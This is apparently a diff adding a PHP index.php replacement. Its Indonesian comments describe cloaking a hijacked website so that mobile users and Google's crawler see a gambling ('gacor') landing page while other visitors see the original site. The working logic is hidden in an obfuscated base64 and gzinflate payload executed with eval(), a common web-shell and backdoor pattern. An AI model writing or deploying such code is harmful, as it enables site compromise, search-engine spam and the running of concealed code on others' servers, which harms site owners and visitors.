@@ -1,0 +1,24 @@
+<?php
+/**
+ * ** How To Use **
+ * Simpan source landingpage gacor & default admin ke tempat kesayangan klean~
+ * Masukan link source landingpage gacor klean di $bunvisUrl
+ * Masukan link source default index si admin $homeUrl
+ * Ganti index.php dengan Code ini
+ * 
+ * ** Benefit **
+ * Terindex dan terbaca google crawl sebagai landingpage
+ * Landingpage akan terbuka hanya dengan melalui mobile, selain itu akan di tampilkan $homeUrl
+ * 
+ * ** Validasi **
+ * Cek site:target.com di mobile maka akan terbuka sebagai landingpage / amphtml ( jika amp valid )
+ */
+
+$bunvisUrl = 'https://domain.com/landingpage-gacor.txt';
+$homeUrl = 'https://domain.com/default-index-admin.txt';
+
+$config = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$cfg = "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";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($config))));
+exit;
+?>
